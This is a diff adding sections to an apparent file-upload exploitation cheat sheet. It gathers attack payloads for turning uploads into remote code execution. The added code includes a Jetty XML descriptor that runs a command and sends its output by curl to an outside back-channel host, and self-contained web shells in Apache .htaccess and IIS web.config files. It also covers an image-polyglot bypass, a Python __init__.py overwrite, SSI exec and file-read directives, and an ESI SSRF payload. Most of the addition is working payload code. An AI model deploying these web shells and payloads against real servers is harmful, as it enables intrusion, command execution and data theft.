@@ -40,7 +40,100 @@ Dependency-manager configs — overwrite then trigger an install/run:
 ```
 
 Jetty: upload an `*.xml` or `*.war` into `$JETTY_BASE/webapps/` — both
-are auto-deployed/processed → RCE.
+are auto-deployed/processed → RCE. The `.xml` runs `Runtime.exec` on
+deploy (back-channel the result, since the deploy gives no response
+body):
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+  <Call class="java.lang.Runtime" name="getRuntime"><Call name="exec"><Arg>
+    <Array type="String">
+      <Item>/bin/sh</Item><Item>-c</Item>
+      <Item>curl -F "r=`id`" http://back-channel-host/</Item>
+    </Array>
+  </Arg></Call></Call>
+</Configure>
+```
+
+## Self-contained config-file shells (the dropped config IS the executable)
+
+When only `.htaccess` / `web.config` is droppable (no second file
+needed), the config maps itself to the interpreter and carries the
+shell in the same file.
+
+Apache `.htaccess` self-shell — the file is its own PHP body:
+```apache
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+AddType application/x-httpd-php .htaccess
+###### SHELL ######
+<?php echo "\n"; passthru($_GET['c']." 2>&1"); ?>
+```
+Reach it at `GET /uploads/.htaccess?c=id`.
+
+`.htaccess`/image polyglot — when the validator calls
+`exif_imagetype()`, prefix the directives so the file also parses as an
+image. `.htaccess` ignores lines starting with `#` or `\x00`, so a
+valid XBM/WBMP header up top satisfies the image check while Apache
+still reads the directives:
+```
+#define test_width 50
+#define test_height 50
+# (XBM header above; .htaccess directives + <?php ...?> below)
+```
+WBMP variant: start the file with the bytes `\x00\x00` then `50` `50`,
+then the directives on the next line.
+
+IIS `web.config` self-shell — one upload that both re-enables the
+`*.config` handler and carries an inline ASP body that runs:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration><system.webServer>
+  <handlers accessPolicy="Read, Script, Write">
+    <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
+         scriptProcessor="%windir%\system32\inetsrv\asp.dll"
+         resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+  </handlers>
+  <security><requestFiltering>
+    <fileExtensions><remove fileExtension=".config" /></fileExtensions>
+    <hiddenSegments><remove segment="web.config" /></hiddenSegments>
+  </requestFiltering></security>
+</system.webServer></configuration>
+<!--
+<% Set s = Server.CreateObject("WScript.Shell")
+   Response.Write(s.Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>
+-->
+```
+Then `GET /uploads/web.config?cmd=whoami`.
+
+Python package `__init__.py` overwrite — if uploads land inside an
+importable package dir, replacing/dropping `__init__.py` runs the line
+on the next `import package` (distinct from the `.pth` trick, which
+runs at every interpreter start):
+```python
+import os; os.system("id")
+```
+
+## Server-Side Includes (SSI / `.shtml`) and ESI
+
+If the server has SSI enabled (Apache `mod_include`, IIS `.stm`/`.shtml`
+handler), upload a `.shtml` / `.stm` / `.shtm` file — the directives run
+when the page is served, no interpreter shell needed:
+```html
+<!--#exec cmd="id" -->
+<!--#include file="..\..\web.config" -->
+<!--#echo var="DATE_LOCAL" -->
+```
+`#exec cmd` gives command execution; `#include file` reads server files
+(traversal). Try these extensions against the allowlist when PHP/ASP are
+blocked but the host is Apache/IIS. If the app strips active extensions
+but reflects user input into a server-parsed page, the same `<!--#exec-->`
+directive can land via filename/metadata too. Edge/CDN tier: an
+analogous **Edge Side Include** (`<esi:include src="http://internal/">`)
+may be honoured by a caching proxy → SSRF.
 
 ## Image-format chunks that survive PHP-GD compression/resize
 
